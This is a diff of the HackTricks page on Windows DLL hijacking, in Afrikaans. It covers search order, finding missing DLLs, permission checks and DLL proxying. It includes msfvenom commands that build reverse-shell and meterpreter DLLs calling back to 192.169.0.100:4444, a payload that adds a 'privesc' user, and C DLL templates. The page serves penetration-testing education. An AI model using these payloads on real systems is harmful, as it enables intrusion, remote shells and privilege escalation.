@@ -1,141 +1,143 @@
-# Dll Kaping
+# Dll Hijacking
+
+{% hint style="success" %}
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin verdien belonings tot **$100,000**!
+**Bug bounty wenk**: **meld aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit vandag by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) en begin om bounties tot **$100,000** te verdien!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
 ## Basiese Inligting
 
-DLL Kaping behels die manipulering van 'n vertroude toepassing om 'n skadelike DLL te laai. Hierdie term sluit verskeie taktieke in soos **DLL Spoofing, Injection, en Side-Loading**. Dit word hoofsaaklik gebruik vir kode-uitvoering, bereiking van volharding, en, minder algemeen, voorreg-escalasie. Ten spyte van die fokus op escalasie hier, bly die metode van kaping konsekwent oor doelwitte.
+DLL Hijacking behels die manipulasie van 'n vertroude toepassing om 'n kwaadwillige DLL te laai. Hierdie term sluit verskeie taktieke in soos **DLL Spoofing, Injection, en Side-Loading**. Dit word hoofsaaklik gebruik vir kode-uitvoering, om volharding te bereik, en, minder algemeen, privilige-escalasie. Ten spyte van die fokus op escalasie hier, bly die metode van hijacking konsekwent oor doelwitte.
 
 ### Algemene Tegnieke
 
-Verskeie metodes word gebruik vir DLL-kaping, elk met sy doeltreffendheid afhanklik van die toepassing se DLL-laai-strategie:
+Verskeie metodes word gebruik vir DLL hijacking, elk met sy doeltreffendheid afhangende van die toepassing se DLL-laai strategie:
 
-1. **DLL Vervanging**: Die ruiling van 'n ware DLL met 'n skadelike een, opsioneel met die gebruik van DLL Proxying om die funksionaliteit van die oorspronklike DLL te behou.
-2. **DLL Soekorde Kaping**: Die plaas van die skadelike DLL in 'n soekpad voor die regmatige een, wat die toepassing se soekpatroon benut.
-3. **Spook DLL Kaping**: Die skep van 'n skadelike DLL vir 'n toepassing om te laai, dinkende dit is 'n nie-bestaande vereiste DLL.
-4. **DLL Aanstuur**: Die wysiging van soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local` lêers om die toepassing na die skadelike DLL te rig.
-5. **WinSxS DLL Vervanging**: Die vervanging van die regmatige DLL met 'n skadelike eweknie in die WinSxS-gids, 'n metode wat dikwels geassosieer word met DLL side-loading.
-6. **Relatiewe Pad DLL Kaping**: Die plaas van die skadelike DLL in 'n gebruikerbeheerde gids saam met die gekopieerde toepassing, wat lyk na Binêre Proxy Uitvoeringstegnieke.
+1. **DLL Vervanging**: Om 'n egte DLL met 'n kwaadwillige een te vervang, opsioneel met DLL Proxying om die oorspronklike DLL se funksionaliteit te behou.
+2. **DLL Soekorde Hijacking**: Om die kwaadwillige DLL in 'n soekpad voor die wettige een te plaas, wat die toepassing se soekpatroon benut.
+3. **Phantom DLL Hijacking**: Om 'n kwaadwillige DLL te skep vir 'n toepassing om te laai, terwyl dit dink dit is 'n nie-bestaande vereiste DLL.
+4. **DLL Herleiding**: Om soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local` lêers te wysig om die toepassing na die kwaadwillige DLL te lei.
+5. **WinSxS DLL Vervanging**: Om die wettige DLL met 'n kwaadwillige teenhanger in die WinSxS-gids te vervang, 'n metode wat dikwels geassosieer word met DLL side-loading.
+6. **Relatiewe Pad DLL Hijacking**: Om die kwaadwillige DLL in 'n gebruiker-beheerde gids saam met die gekopieerde toepassing te plaas, wat lyk soos Binary Proxy Execution tegnieke.
 
-## Vind van ontbrekende Dlls
+## Vind ontbrekende Dlls
 
-Die mees algemene manier om ontbrekende Dlls binne 'n stelsel te vind is deur [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) vanaf sysinternals te hardloop, **stel** die **volgende 2 filters** in:
+Die mees algemene manier om ontbrekende Dlls binne 'n stelsel te vind, is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te loop, **die volgende 2 filters in te stel**:
 
 ![](<../../.gitbook/assets/image (311).png>)
 
 ![](<../../.gitbook/assets/image (313).png>)
 
-en wys net die **Lêersisteemaktiwiteit**:
+en net die **Lêerstelselaktiwiteit** te wys:
 
 ![](<../../.gitbook/assets/image (314).png>)
 
-As jy op soek is na **ontbrekende dlls in die algemeen** moet jy dit vir 'n paar **sekondes laat loop**.\
-As jy op soek is na 'n **ontbrekende dll binne 'n spesifieke uitvoerbare lêer** moet jy 'n **ander filter instel soos "Prosesnaam" "bevat" "\<uitvoernaam>", voer dit uit, en stop die vaslegging van gebeure**.
+As jy op soek is na **ontbrekende dlls in die algemeen**, moet jy dit vir 'n paar **sekondes** laat loop.\
+As jy op soek is na 'n **ontbrekende dll binne 'n spesifieke uitvoerbare**, moet jy **'n ander filter soos "Prosesnaam" "bevat" "\<exec naam>" instel, dit uitvoer, en stop om gebeurtenisse te vang**.
 
-## Uitbuiting van Ontbrekende Dlls
+## Exploiteer Ontbrekende Dlls
 
-Om voorregte te eskaleer, is die beste kans wat ons het om in staat te wees om 'n dll te skryf wat 'n voorregproses sal probeer laai in 'n plek waar dit gaan word soek. Daarom sal ons in staat wees om 'n dll te skryf in 'n **gids** waar die **dll voor die oorspronklike dll gesoek word** (vreemde geval), of ons sal in staat wees om **te skryf op 'n gids waar die dll gaan soek word** en die oorspronklike **dll bestaan nie** in enige gids nie.
+Om privilige te verhoog, is die beste kans wat ons het om **'n dll te kan skryf wat 'n privilige proses sal probeer laai** in een van **die plekke waar dit gesoek gaan word**. Daarom sal ons in staat wees om **'n dll te skryf in 'n **gids** waar die **dll gesoek word voordat** die gids waar die **oorspronklike dll** is (vreemde geval), of ons sal in staat wees om **te skryf in 'n gids waar die dll gesoek gaan word** en die oorspronklike **dll nie in enige gids bestaan** nie.
 
 ### Dll Soekorde
 
-Binne die [**Microsoft-dokumentasie**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy vind hoe die Dlls spesifiek gelaai word**.
+**Binne die** [**Microsoft dokumentasie**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy vind hoe die Dlls spesifiek gelaai word.**
 
-**Windows-toepassings** soek na DLLs deur 'n reeks **voorafbepaalde soekpaaie** te volg, in ooreenstemming met 'n spesifieke volgorde. Die probleem van DLL-kaping ontstaan wanneer 'n skadelike DLL strategies in een van hierdie gids geplaas word, om te verseker dat dit gelaai word voordat die egte DLL. 'n Oplossing om dit te voorkom is om te verseker dat die toepassing absolute paaie gebruik wanneer verwys word na die DLLs wat dit benodig.
+**Windows toepassings** soek na DLLs deur 'n stel van **vooraf gedefinieerde soekpade** te volg, wat aan 'n spesifieke volgorde voldoen. Die probleem van DLL hijacking ontstaan wanneer 'n skadelike DLL strategies in een van hierdie gidse geplaas word, wat verseker dat dit gelaai word voordat die egte DLL. 'n Oplossing om dit te voorkom, is om te verseker dat die toepassing absolute pades gebruik wanneer dit na die DLLs verwys wat dit benodig.
 
-Jy kan die **DLL-soekorde op 32-bietjie** stelsels hieronder sien:
+Jy kan die **DLL soekorde op 32-bis** stelsels hieronder sien:
 
 1. Die gids waaruit die toepassing gelaai is.
-2. Die stelselgids. Gebruik die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) funksie om die pad van hierdie gids te kry.(_C:\Windows\System32_)
-3. Die 16-bietjie stelselgids. Daar is geen funksie wat die pad van hierdie gids kry nie, maar dit word gesoek. (_C:\Windows\System_)
+2. Die stelseldirectory. Gebruik die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) funksie om die pad van hierdie gids te kry.(_C:\Windows\System32_)
+3. Die 16-bis stelseldirectory. Daar is geen funksie wat die pad van hierdie gids verkry nie, maar dit word gesoek. (_C:\Windows\System_)
 4. Die Windows-gids. Gebruik die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) funksie om die pad van hierdie gids te kry.
 1. (_C:\Windows_)
 5. Die huidige gids.
-6. Die gidse wat in die PATH-omgewingsveranderlike gelys is. Let daarop dat dit nie die per-toepassing-gids insluit wat deur die **App Paths**-register sleutel gespesifiseer is nie. Die **App Paths** sleutel word nie gebruik wanneer die DLL-soekpad bereken word nie.
+6. Die gidse wat in die PATH omgewing veranderlike gelys is. Let daarop dat dit nie die per-toepassing pad insluit wat deur die **App Paths** register sleutel gespesifiseer is nie. Die **App Paths** sleutel word nie gebruik wanneer die DLL soekpad bereken word nie.
 
-Dit is die **verstek** soekorde met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer word, eskaleer die huidige gids na die tweede plek. Om hierdie funksie te deaktiveer, skep die **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit in op 0 (verstek is geaktiveer).
+Dit is die **standaard** soekorde met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer is, styg die huidige gids na die tweede plek. Om hierdie funksie te deaktiveer, skep die **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit op 0 (standaard is geaktiveer).
 
-As [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funksie geroep word met **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** begin die soektog in die gids van die uitvoerbare module wat **LoadLibraryEx** laai.
+As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funksie met **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** aangeroep word, begin die soek in die gids van die uitvoerbare module wat **LoadLibraryEx** laai.
 
-Laastens, let daarop dat **'n dll gelaai kan word deur die absolute pad aan te dui in plaas van net die naam**. In daardie geval gaan daardie dll **net in daardie pad gesoek word** (as die dll enige afhanklikhede het, gaan hulle gesoek word soos net deur naam gelaai).
+Laastens, let daarop dat **'n dll gelaai kan word wat die absolute pad aandui in plaas van net die naam**. In daardie geval sal daardie dll **slegs in daardie pad gesoek word** (as die dll enige afhanklikhede het, sal hulle gesoek word soos net gelaai deur naam).
 
-Daar is ander maniere om die soekorde te verander maar ek gaan dit nie hier verduidelik nie.
-#### Uitsluitings op dll-soekvolgorde vanaf Windows-dokumentasie
+Daar is ander maniere om die soekorde te verander, maar ek gaan dit nie hier verduidelik nie.
 
-Sekere uitsonderings op die standaard DLL-soekvolgorde word genoteer in die Windows-dokumentasie:
+#### Uitsonderings op dll soekorde van Windows docs
 
-- Wanneer 'n **DLL wat sy naam deel met een wat reeds in die geheue gelaai is**, aangetref word, omseil die stelsel die gewone soektog. In plaas daarvan, voer dit 'n kontrole vir omleiding en 'n manifest uit voordat dit verstek na die reeds in die geheue gelaai DLL gaan. **In hierdie scenario, doen die stelsel nie 'n soektog vir die DLL nie**.
-- In gevalle waar die DLL erken word as 'n **bekende DLL** vir die huidige Windows-weergawe, sal die stelsel sy weergawe van die bekende DLL gebruik, saam met enige van sy afhanklike DLL's, **om die soekproses te vermy**. Die register sleutel **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** hou 'n lys van hierdie bekende DLL's.
-- Indien 'n **DLL afhanklikhede het**, word die soektog na hierdie afhanklike DLL's uitgevoer asof hulle slegs deur hul **module name** aangedui is, ongeag of die aanvanklike DLL deur 'n volledige pad geïdentifiseer is.
+Sekere uitsonderings op die standaard DLL soekorde word in Windows dokumentasie opgemerk:
 
-### Voorregte Eskalasie
+* Wanneer 'n **DLL wat sy naam met een wat reeds in geheue gelaai is, deel**, teëgekom word, omseil die stelsel die gewone soek. In plaas daarvan, voer dit 'n kontrole vir herleiding en 'n manifest uit voordat dit na die DLL wat reeds in geheue is, terugkeer. **In hierdie scenario, voer die stelsel nie 'n soek na die DLL uit nie**.
+* In gevalle waar die DLL erken word as 'n **kenner DLL** vir die huidige Windows weergawe, sal die stelsel sy weergawe van die kenner DLL gebruik, saam met enige van sy afhanklike DLLs, **en die soekproses oorslaan**. Die register sleutel **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** hou 'n lys van hierdie kenner DLLs.
+* As 'n **DLL afhanklikhede het**, word die soek na hierdie afhanklike DLLs uitgevoer asof hulle slegs deur hul **modulename** aangedui is, ongeag of die aanvanklike DLL deur 'n volle pad geïdentifiseer is.
+
+### Escalating Privileges
 
 **Vereistes**:
 
-- Identifiseer 'n proses wat onder **verskillende voorregte** werk of sal werk (horisontale of laterale beweging), wat 'n **DLL kortkom**.
-- Verseker dat **skryftoegang** beskikbaar is vir enige **gids** waarin die **DLL** gesoek sal word. Hierdie plek kan die gids van die uitvoerbare lêer wees of 'n gids binne die stelselpad.
+* Identifiseer 'n proses wat onder **verskillende privilige** (horisontale of laterale beweging) werk of sal werk, wat **'n DLL** ontbreek.
+* Verseker **skrywe toegang** is beskikbaar vir enige **gids** waarin die **DLL** gesoek gaan word. Hierdie plek kan die gids van die uitvoerbare wees of 'n gids binne die stelselpaaie.
 
-Ja, die vereistes is moeilik om te vind aangesien **dit by verstek nogal vreemd is om 'n bevoorregte uitvoerbare lêer sonder 'n dll te vind** en dit is selfs **meer vreemd om skryftoestemmings op 'n stelselpadgids te hê** (jy kan dit nie by verstek hê nie). Maar, in verkeerd gekonfigureerde omgewings is dit moontlik.\
-In die geval dat jy gelukkig is en jy vind dat jy aan die vereistes voldoen, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek nagaan. Selfs al is die **hoofdoel van die projek om UAC te omseil**, kan jy daar 'n **PoC** van 'n Dll-hacking vir die Windows-weergawe vind wat jy kan gebruik (waarskynlik net deur die pad van die gids waar jy skryftoestemmings het, te verander).
+Ja, die vereistes is moeilik om te vind aangesien **dit standaard 'n bietjie vreemd is om 'n bevoorregte uitvoerbare te vind wat 'n dll ontbreek** en dit is selfs **meer vreemd om skrywe toestemmings op 'n stelselpaaigids te hê** (jy kan nie standaard nie). Maar, in verkeerd geconfigureerde omgewings is dit moontlik.\
+In die geval dat jy gelukkig is en jy voldoen aan die vereistes, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek nagaan. Alhoewel die **hooffokus van die projek is om UAC te omseil**, kan jy daar 'n **PoC** van 'n Dll hijaking vir die Windows weergawe vind wat jy kan gebruik (waarskynlik net die pad van die gids waar jy skrywe toestemmings het, verander).
 
-Merk op dat jy jou toestemmings in 'n gids kan **nagaan deur** die volgende te doen:
+Let daarop dat jy **jou toestemmings in 'n gids kan nagaan** deur:
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
 ```
-En **kontroleer die regte van alle lêers binne die PAD**:
+En **kontroleer toestemmings van alle vouers binne PATH**:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-Jy kan ook die invoere van 'n uitvoerbare lêer en die uitvoere van 'n dll kontroleer met:
+U kan ook die invoere van 'n uitvoerbare lêer en die uitvoere van 'n dll nagaan met:
 ```c
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-Vir 'n volledige gids oor hoe om **Dll Hijacking te misbruik om voorregte te eskaleer** met toestemmings om in 'n **Sisteempad-vouer te skryf** kyk:
+For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:
 
 {% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
 [writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
 {% endcontent-ref %}
 
-### Geoutomatiseerde gereedskap
+### Automated tools
 
-[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sal nagaan of jy skryfregte het op enige vouer binne die sisteem PAD.\
-Ander interessante geoutomatiseerde gereedskap om hierdie kwesbaarheid te ontdek is **PowerSploit-funksies**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._
+[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sal kyk of jy skryfrechten het op enige gids binne die systeem PAD.\
+Ander interessante geoutomatiseerde gereedskap om hierdie kwesbaarheid te ontdek is **PowerSploit funksies**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._
 
-### Voorbeeld
+### Example
 
-In die geval dat jy 'n uitbuitbare scenario vind, sal een van die belangrikste dinge om dit suksesvol uit te buit wees om **'n dll te skep wat ten minste al die funksies uitvoer wat die uitvoerbare lêer daarvan sal invoer**. In elk geval, let daarop dat Dll Hijacking handig is om [te eskaleer van Medium Integriteitsvlak na Hoë **(UAC omseil)**](../authentication-credentials-uac-and-efs.md#uac) of van [**Hoë Integriteit na SISTEEM**](./#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **hoe om 'n geldige dll te skep** binne hierdie dll-hijacking-studie wat gefokus is op dll-hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
-Verder, in die **volgende afdeling** kan jy 'n paar **basiese dll-kodes** vind wat nuttig kan wees as **sjablone** of om 'n **dll met nie-verpligte funksies uitgevoer** te skep.
+In die geval dat jy 'n uitbuitbare scenario vind, is een van die belangrikste dinge om dit suksesvol te benut, om **'n dll te skep wat ten minste al die funksies wat die uitvoerbare sal invoer, uitvoer**. In elk geval, let daarop dat Dll Hijacking handig is om te [escalate van Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) of van [**High Integrity to SYSTEM**](./#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **hoe om 'n geldige dll te skep** binne hierdie dll hijacking studie gefokus op dll hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+Boonop kan jy in die **volgende afdeling** 'n paar **basiese dll kodes** vind wat nuttig kan wees as **sjablone** of om 'n **dll met nie vereiste funksies ge-exporteer** te skep.
 
-## **Dlls Skep en Kompilering**
+## **Creating and compiling Dlls**
 
-### **Dll Proksifisering**
+### **Dll Proxifying**
 
-Basies is 'n **Dll-proksi** 'n Dll wat in staat is om **jou skadelike kode uit te voer wanneer dit gelaai word** maar ook om **bloot te lê** en **te werk** soos **verwag** deur **alle oproepe na die werklike biblioteek te relayeer**.
+Basies is 'n **Dll proxy** 'n Dll wat in staat is om **jou kwaadwillige kode uit te voer wanneer dit gelaai word** maar ook om te **bloot te stel** en **te werk** soos **verwag** deur **alle oproepe na die werklike biblioteek te relaye**.
 
-Met die gereedskap [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik **'n uitvoerbare lêer aandui en die biblioteek kies** wat jy wil proksifiseer en **'n geproksifiseerde dll genereer** of **die Dll aandui** en **'n geproksifiseerde dll genereer**.
+Met die gereedskap [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik **'n uitvoerbare aandui en die biblioteek kies** wat jy wil proxify en **'n proxified dll genereer** of **die Dll aandui** en **'n proxified dll genereer**.
 
 ### **Meterpreter**
 
-**Kry rev-skaal (x64):**
+**Get rev shell (x64):**
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
@@ -143,13 +145,13 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**Skep 'n gebruiker (x86 Ek het nie 'n x64 weergawe gesien nie):**
+**Skep 'n gebruiker (x86 ek het nie 'n x64 weergawe gesien):**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
 ### Jou eie
 
-Let daarop dat in verskeie gevalle die Dll wat jy saamstel, **veral verskeie funksies moet uitvoer** wat deur die slagofferproses gelaai gaan word, as hierdie funksies nie bestaan nie, sal die **binêre lêer nie in staat wees om hulle te laai** en die **uitbuiting sal misluk**.
+Let op dat die Dll wat jy saamstel in verskeie gevalle **verskeie funksies moet uitvoer** wat deur die slagofferproses gelaai gaan word; as hierdie funksies nie bestaan nie, sal die **binaire nie in staat wees om** hulle te laai nie en die **uitbuiting sal misluk**.
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
@@ -237,20 +239,21 @@ return TRUE;
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bugsbounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bugsbounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin om belonings tot **$100,000** te verdien!
+**Foutbeloning wenk**: **meld aan** vir **Intigriti**, 'n premium **foutbeloning platform geskep deur hackers, vir hackers**! Sluit vandag by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) en begin om belonings tot **$100,000** te verdien!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
+{% hint style="success" %}
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
